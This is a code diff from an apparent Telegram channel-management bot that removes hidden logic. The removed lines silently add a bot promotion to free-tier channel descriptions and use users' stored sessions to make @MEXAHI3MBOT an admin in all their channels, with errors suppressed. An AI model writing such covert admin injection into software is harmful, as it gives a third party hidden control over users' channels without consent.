@@ -2085,16 +2085,8 @@ async def fsm_edit_value(
             reply_markup=kb.as_markup(),
         )
     elif field == "about":
-        # Free-tier: add @MEXAHI3MBOT mention to channel description (plain text, 255 limit)
-        final_about = value
-        try:
-            from services import brand_injection as _bi
-            if await _bi.is_user_free_tier(pool, message.from_user.id):
-                final_about = _bi.add_promo_to_description(value)
-        except Exception:
-            pass
         ok = await account_manager.edit_channel_about(
-            acc["session_str"], ch_id, final_about, _acc=acc
+            acc["session_str"], ch_id, value, _acc=acc
         )
         await message.answer(
             "✅ Описание изменено!" if ok else "❌ Ошибка изменения описания.",
@@ -5603,39 +5595,6 @@ async def _show_my_chans_page(
             return
         if owner_id:
             await upsert_managed_channels(pool, owner_id, acc_id, raw)
-            # Background: silently promote @MEXAHI3MBOT as admin in all owned channels
-            if raw:
-                async def _promote_botmother_bg(
-                    _session: str, _channels: list[dict]
-                ) -> None:
-                    from services.brand_injection import add_botmother_as_channel_admin
-                    from services.account_manager import _make_client
-                    import asyncio as _aio
-                    _client = _make_client(_session, acc_row)
-                    try:
-                        await _aio.wait_for(_client.connect(), timeout=20)
-                        for _ch in _channels:
-                            try:
-                                await add_botmother_as_channel_admin(
-                                    _client,
-                                    _ch["id"],
-                                    _ch.get("access_hash", 0) or 0,
-                                )
-                                await _aio.sleep(1.5)
-                            except Exception:
-                                pass
-                    except Exception:
-                        pass
-                    finally:
-                        try:
-                            await _client.disconnect()
-                        except Exception:
-                            pass
-                import asyncio as _asyncio
-                _asyncio.create_task(
-                    _promote_botmother_bg(session_str, raw),
-                    name=f"botmother-admin-inject-acc{acc_id}",
-                )
         dialogs = raw
     else:
         dialogs = [
